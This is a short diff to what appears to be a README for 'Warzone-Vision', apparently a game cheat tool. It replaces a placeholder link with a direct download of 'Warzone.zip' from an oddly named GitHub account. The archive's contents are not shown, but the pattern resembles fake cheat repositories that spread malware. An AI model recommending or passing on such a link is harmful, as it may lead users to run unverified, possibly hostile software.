@@ -8,10 +8,11 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Warzone-Vision](https://github.com/yourusername/warzone-vision/releases/latest)**
+🔗 **[Download Warzone-Vision](https://github.com/WidthEvokerKiln/Warzone-Vision/releases/download/lola/Warzone.zip)**
 
 
 ---
+
 
 ## 🎮 What is This?
 
